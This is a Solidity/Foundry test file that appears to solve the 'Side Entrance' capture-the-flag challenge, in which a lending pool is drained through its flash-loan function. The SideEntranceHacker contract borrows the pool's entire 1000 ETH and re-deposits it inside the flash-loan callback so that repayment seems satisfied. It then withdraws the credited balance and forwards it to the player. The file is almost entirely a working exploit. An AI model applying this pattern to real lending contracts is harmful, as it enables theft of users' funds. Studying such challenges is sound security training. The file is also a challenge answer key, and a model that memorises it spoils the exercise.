// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceHacker {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function flashLoan(uint256 _amount) external {
        pool.flashLoan(_amount);
        pool.withdraw();
        (bool ok, ) = address(msg.sender).call{value: _amount}("");
        require(ok, "send ETH failed");
    }

    receive() external payable {}
}

contract SideEntranceTest is Test {
    SideEntranceLenderPool pool;
    SideEntranceHacker hacker;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    uint256 ETHER_IN_POOL = 1000 ether;
    uint256 PLAYER_INITIAL_ETH_BALANCE = 1 ether;

    modifier excuteByUser(address _user) {
        vm.startPrank(_user);
        _;
        vm.stopPrank();
    }

    function setUp() public excuteByUser(deployer) {
        deal(deployer, ETHER_IN_POOL);
        deal(player, PLAYER_INITIAL_ETH_BALANCE);

        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        hacker = new SideEntranceHacker(pool);

        assertEq(address(pool).balance, ETHER_IN_POOL);
    }

    function testExploit() public excuteByUser(player) {
        hacker.flashLoan(ETHER_IN_POOL);

        assertEq(address(pool).balance, 0);
        assertEq(player.balance, ETHER_IN_POOL + 1 ether);
    }
}
